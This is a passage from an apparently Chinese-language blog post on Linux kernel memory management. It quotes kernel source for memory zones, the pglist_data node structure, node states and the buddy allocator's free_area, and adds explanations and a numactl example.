are:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1. Pinned pages: (long-term) pinning of movable pages might</span></span><br><span class="line"><span class="comment"> *    essentially turn such pages unmovable. Therefore, we do not allow</span></span><br><span class="line"><span class="comment"> *    pinning long-term pages in ZONE_MOVABLE. When pages are pinned and</span></span><br><span class="line"><span class="comment"> *    faulted, they come from the right zone right away. However, it is</span></span><br><span class="line"><span class="comment"> *    still possible that address space already has pages in</span></span><br><span class="line"><span class="comment"> *    ZONE_MOVABLE at the time when pages are pinned (i.e. user has</span></span><br><span class="line"><span class="comment"> *    touches that memory before pinning). In such case we migrate them</span></span><br><span class="line"><span class="comment"> *    to a different zone. When migration fails - pinning fails.</span></span><br><span class="line"><span class="comment"> * 2. memblock allocations: kernelcore/movablecore setups might create</span></span><br><span class="line"><span class="comment"> *    situations where ZONE_MOVABLE contains unmovable allocations</span></span><br><span class="line"><span class="comment"> *    after boot. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment"> * 3. Memory holes: kernelcore/movablecore setups might create very rare</span></span><br><span class="line"><span class="comment"> *    situations where ZONE_MOVABLE contains memory holes after boot,</span></span><br><span class="line"><span class="comment"> *    for example, if we have sections that are only partially</span></span><br><span class="line"><span class="comment"> *    populated. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment"> * 4. PG_hwpoison pages: while poisoned pages can be skipped during</span></span><br><span class="line"><span class="comment"> *    memory offlining, such pages cannot be allocated.</span></span><br><span class="line"><span class="comment"> * 5. Unmovable PG_offline pages: in paravirtualized environments,</span></span><br><span class="line"><span class="comment"> *    hotplugged memory blocks might only partially be managed by the</span></span><br><span class="line"><span class="comment"> *    buddy (e.g., via XEN-balloon, Hyper-V balloon, virtio-mem). The</span></span><br><span class="line"><span class="comment"> *    parts not manged by the buddy are unmovable PG_offline pages. In</span></span><br><span class="line"><span class="comment"> *    some cases (virtio-mem), such pages can be skipped during</span></span><br><span class="line"><span class="comment"> *    memory offlining, however, cannot be moved/allocated. These</span></span><br><span class="line"><span class="comment"> *    techniques might use alloc_contig_range() to hide previously</span></span><br><span class="line"><span class="comment"> *    exposed pages from the buddy again (e.g., to implement some sort</span></span><br><span class="line"><span class="comment"> *    of memory unplug in virtio-mem).</span></span><br><span class="line"><span class="comment"> * 6. ZERO_PAGE(0), kernelcore/movablecore setups might create</span></span><br><span class="line"><span class="comment"> *    situations where ZERO_PAGE(0) which is allocated differently</span></span><br><span class="line"><span class="comment"> *    on different platforms may end up in a movable zone. ZERO_PAGE(0)</span></span><br><span class="line"><span class="comment"> *    cannot be migrated.</span></span><br><span class="line"><span class="comment"> * 7. Memory-hotplug: when using memmap_on_memory and onlining the</span></span><br><span class="line"><span class="comment"> *    memory to the MOVABLE zone, the vmemmap pages are also placed in</span></span><br><span class="line"><span class="comment"> *    such zone. Such pages cannot be really moved around as they are</span></span><br><span class="line"><span class="comment"> *    self-stored in the range, but they are treated as movable when</span></span><br><span class="line"><span class="comment"> *    the range they describe is about to be offlined.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In general, no unmovable allocations that degrade memory offlining</span></span><br><span class="line"><span class="comment"> * should end up in ZONE_MOVABLE. Allocators (like alloc_contig_range())</span></span><br><span class="line"><span class="comment"> * have to expect that migrating pages in ZONE_MOVABLE can fail (even</span></span><br><span class="line"><span class="comment"> * if has_unmovable_pages() states that there are no unmovable pages,</span></span><br><span class="line"><span class="comment"> * there can be false negatives).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_MOVABLE,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DEVICE</span></span><br><span class="line">ZONE_DEVICE,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">__MAX_NR_ZONES</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>ZONE_DMA：直接内存访问区域，使用 DMA 内存情况 :有些设备架构比较老 , 无法直接访问整个内存 , 需要使用 DMA 直接内存访问区域 ;</li><li>ZONE_DMA32：对应的是64位系统 , DMA32区域。可以支持两种设备的访问，只能直接访问 16 MB 以下的内存设备；只能直接访问 4 GB 以下的内存设备。</li><li>ZONE_NORMAL：普通内存区域，该内存区域 可以 直接映射到 “ 内核虚拟地址空间 “。</li><li>ZONE_HIGHMEM：高端内存区域，这是32位架构中的概念，<code>DMA</code> 和 <code>DMA32</code> 又称为”低端内存区域”。</li><li>ZONE_MOVABLE：”可移动区域” , 这是为了防止”内存碎片”的伪内存区。</li><li>ZONE_DEVICE：”设备区域”, 这是为了支持”内存热插拔”而设置的内存区域 , 每个设备区域使用 zone 结构体表示。</li></ul><p>大致总结一下，下面先看X86-32</p><table><thead><tr><th>Type</th><th>Start address</th><th>End address</th></tr></thead><tbody><tr><td>ZONE_DMA</td><td>0MB</td><td>16MB</td></tr><tr><td>ZONE_NORMAL</td><td>16MB</td><td>896MB</td></tr><tr><td>ZONE_HIGHMEM</td><td>896MB</td><td>…</td></tr></tbody></table><p>X86-64</p><table><thead><tr><th>Type</th><th>Start address</th><th>End address</th></tr></thead><tbody><tr><td>ZONE_DMA</td><td>0MB</td><td>16MB</td></tr><tr><td>ZONE_DMA32</td><td>16MB</td><td>4GB</td></tr><tr><td>ZONE_NORMAL</td><td>4GB</td><td>…</td></tr></tbody></table><h2 id="struct-pglist-data"><a href="#struct-pglist-data" class="headerlink" title="struct pglist_data"></a>struct pglist_data</h2><p>zone上一层则是节点，Linux将内存控制器作为节点划分的依据，对于 UMA 架构而言只有一个节点，而对于 NUMA 架构而言通常有多个节点，对于同一个内存控制器下的 CPU 而言其对应的节点称之为本地内存，不同处理器之间通过总线进行进一步的连接。</p><p><img   src="/images/hAopSNYg23VeWzq.png" ></p><p>一个节点使用<code>pglist_data</code>结构进行描述</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node_zones contains just the zones for THIS node. Not all of the</span></span><br><span class="line"><span class="comment"> * zones may be populated, but it is the full list. It is referenced by</span></span><br><span class="line"><span class="comment"> * this node&#x27;s node_zonelists as well as other node&#x27;s node_zonelists.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node_zonelists contains references to all zones in all nodes.</span></span><br><span class="line"><span class="comment"> * Generally the first zones will be references to this node&#x27;s</span></span><br><span class="line"><span class="comment"> * node_zones.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> nr_zones; <span class="comment">/* number of populated zones in this node */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FLATMEM<span class="comment">/* means !SPARSEMEM */</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Must be held any time you expect node_start_pfn,</span></span><br><span class="line"><span class="comment"> * node_present_pages, node_spanned_pages or nr_zones to stay constant.</span></span><br><span class="line"><span class="comment"> * Also synchronizes pgdat-&gt;first_deferred_pfn during deferred page</span></span><br><span class="line"><span class="comment"> * init.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * pgdat_resize_lock() and pgdat_resize_unlock() are provided to</span></span><br><span class="line"><span class="comment"> * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment"> * or CONFIG_DEFERRED_STRUCT_PAGE_INIT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Nests above zone-&gt;lock and zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_start_pfn;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_present_pages; <span class="comment">/* total number of physical pages */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_spanned_pages; <span class="comment">/* total size of physical page</span></span><br><span class="line"><span class="comment">     range, including holes */</span></span><br><span class="line"><span class="keyword">int</span> node_id;</span><br><span class="line"><span class="keyword">wait_queue_head_t</span> kswapd_wait;</span><br><span class="line"><span class="keyword">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* workqueues for throttling reclaim for different reasons. */</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> reclaim_wait[NR_VMSCAN_THROTTLE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">atomic_t</span> nr_writeback_throttled;<span class="comment">/* nr of writeback-throttled tasks */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr_reclaim_start;<span class="comment">/* nr pages written while throttled</span></span><br><span class="line"><span class="comment"> * when throttling started. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">kswapd_lock</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span><span class="comment">/* Protected by kswapd_lock */</span></span><br><span class="line"><span class="keyword">int</span> kswapd_order;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kswapd_highest_zoneidx</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> kswapd_failures;<span class="comment">/* Number of &#x27;reclaimed == 0&#x27; runs */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line"><span class="keyword">int</span> kcompactd_max_order;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_highest_zoneidx</span>;</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="keyword">bool</span> proactive_compact_trigger;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a per-node reserve of pages that are not available</span></span><br><span class="line"><span class="comment"> * to userspace allocations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node reclaim becomes active if more unmapped pages exist.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>min_unmapped_pages;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write-intensive fields used by page reclaim */</span></span><br><span class="line">CACHELINE_PADDING(_pad1_);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If memory initialisation on large machines is deferred then this</span></span><br><span class="line"><span class="comment"> * is the first PFN that needs to be initialised.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">deferred_split</span> <span class="title">deferred_split_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA_BALANCING</span></span><br><span class="line"><span class="comment">/* start time in ms of current promote rate limit period */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nbp_rl_start;</span><br><span class="line"><span class="comment">/* number of promote candidate pages at start time of current rate limit period */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nbp_rl_nr_cand;</span><br><span class="line"><span class="comment">/* promote threshold in ms */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nbp_threshold;</span><br><span class="line"><span class="comment">/* start time in ms of current promote threshold adjustment period */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nbp_th_start;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * number of promote candidate pages at start time of current promote</span></span><br><span class="line"><span class="comment"> * threshold adjustment period</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nbp_th_nr_cand;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> THIS IS UNUSED IF MEMCG IS ENABLED.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Use mem_cgroup_lruvec() to look up lruvecs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>__<span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LRU_GEN</span></span><br><span class="line"><span class="comment">/* kswap mm walk data */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lru_gen_mm_walk</span> <span class="title">mm_walk</span>;</span></span><br><span class="line"><span class="comment">/* lru_gen_folio list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lru_gen_memcg</span> <span class="title">memcg_lru</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">CACHELINE_PADDING(_pad2_);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Per-node vmstats */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_nodestat</span> __<span class="title">percpu</span> *<span class="title">per_cpu_nodestats</span>;</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_stat[NR_VM_NODE_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memory_tier</span> __<span class="title">rcu</span> *<span class="title">memtier</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memory_failure_stats</span> <span class="title">mf_stats</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">pg_data_t</span>;</span><br></pre></td></tr></table></figure><h3 id="成员描述"><a href="#成员描述" class="headerlink" title="成员描述"></a>成员描述</h3><ul><li><strong>node_zones</strong>: node 的 zone 列表，节点中最重要的字段 <code>node_zones</code> 作为一个 zone 结构体数组 记录了本节点上所有的 zone，其中有效的 zone 的个数由节点结构体的 <code>nr_zones</code> 字段指出。</li><li><strong>node_zonelists</strong>: 内存分配时备用 zone 的搜索顺序，该字段用以确定内存分配时对备用的 zone 的搜索顺序，在本节点常规内存分配失败时会沿着这个数组进行搜索，其中包含的 zone 可以是非本节点的 zone。</li></ul><p>其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span><span class="comment">/* Pointer to actual zone */</span></span><br><span class="line"><span class="keyword">int</span> zone_idx;<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>node_start_pfn</strong>: node 的起始页框标号，该字段记录了该节点上的物理内存起始页框标号。</li><li><strong>node_present_pages</strong>: node中物理页的总数量。</li><li><strong>node_spanned_pages</strong>: 该字段记录了节点上包括空洞在内的页帧为单位的该节点内存的总长度。</li><li><strong>node_id</strong>: 该字段记录了该节点在系统中的标号，从 0 开始。</li></ul><h3 id="node存储方式"><a href="#node存储方式" class="headerlink" title="node存储方式"></a>node存储方式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> *<span class="title">node_data</span>[<span class="title">MAX_NUMNODES</span>] __<span class="title">read_mostly</span>;</span></span><br><span class="line">EXPORT_SYMBOL(node_data);</span><br></pre></td></tr></table></figure><p>在内核中定一个名为<code>node_data</code>的<code>pglist_data</code>数组，该数组保存着系统中的所有节点。</p><p><img   src="/images/KcHILforOySi8YR.png" ></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ numactl --hardware</span><br><span class="line">available: 1 nodes (0)</span><br><span class="line">node 0 cpus: 0 1</span><br><span class="line">node 0 size: 3904 MB</span><br><span class="line">node 0 free: 313 MB</span><br><span class="line">node distances:</span><br><span class="line">node   0 </span><br><span class="line">  0:  10 </span><br><span class="line">➜  ~ </span><br></pre></td></tr></table></figure><p>在Linux中可以用上述命令查看存在多少node。</p><h3 id="node状态"><a href="#node状态" class="headerlink" title="node状态"></a>node状态</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nodemask_t</span> node_states[NR_NODE_STATES] __read_mostly = &#123;</span><br><span class="line">[N_POSSIBLE] = NODE_MASK_ALL,</span><br><span class="line">[N_ONLINE] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_NUMA</span></span><br><span class="line">[N_NORMAL_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">[N_HIGH_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">[N_MEMORY] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line">[N_CPU] = &#123; &#123; [<span class="number">0</span>] = <span class="number">1UL</span> &#125; &#125;,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span><span class="comment">/* NUMA */</span></span></span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(node_states);</span><br></pre></td></tr></table></figure><p>在Linux中存在上面这样一个全局数组用以表示标识对应标号的节点状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> DECLARE_BITMAP(bits, MAX_NUMNODES); &#125; <span class="keyword">nodemask_t</span>;</span><br></pre></td></tr></table></figure><p>这里<code>nodemask_t</code>是一个位图类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">node_states</span> &#123;</span></span><br><span class="line">N_POSSIBLE,<span class="comment">/* The node could become online at some point */</span></span><br><span class="line">N_ONLINE,<span class="comment">/* The node is online */</span></span><br><span class="line">N_NORMAL_MEMORY,<span class="comment">/* The node has regular memory */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">N_HIGH_MEMORY,<span class="comment">/* The node has regular or high memory */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">N_HIGH_MEMORY = N_NORMAL_MEMORY,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">N_MEMORY,<span class="comment">/* The node has memory(regular, high, movable) */</span></span><br><span class="line">N_CPU,<span class="comment">/* The node has one or more cpus */</span></span><br><span class="line">N_GENERIC_INITIATOR,<span class="comment">/* The node has one or more Generic Initiators */</span></span><br><span class="line">NR_NODE_STATES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个状态由一个枚举类型 <code>node_states</code> 定义。</p><h2 id="buddy-system中的内存组织形式"><a href="#buddy-system中的内存组织形式" class="headerlink" title="buddy system中的内存组织形式"></a>buddy system中的内存组织形式</h2><p>在上面简单提到了这一zone中的成员，其作用主要用于存储<code>buddy system</code>按照order管理的页面。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span><span class="title">free_area</span>[<span class="title">MAX_ORDER</span> + 1];</span></span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br></pre></td></tr></table></figure><p>这里的<code>MAX_ORDER</code>的值为10所以其数组定义为11。</p><p>在<code>buddy system</code>中按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为连续的空闲页面的大小，不过单位不是页面数，而是介，即对于每个下标而言，其中所存储的页面大小为：<code>2^order</code>。</p><p>在<code>free_area</code>中存放的页面通过自身相应字段连接成双向链表结构，在前文中有详细介绍。这里简单说一下<code>free_area</code>结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里的<code>nr_free</code>成员很明显就是用于记录了在当前<code>free_area</code>中的空闲页面块的数量，对于<code>free_area[0]</code>以外的<code>free_area</code>而言其单位并非是单个页框，而是以内存块为单位。</p><p>而<code>free_list</code>成员则是为<code>list_head</code>的链表结构其通过page结构体的<code>lru</code>字段将page结构体连接成双向链表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span 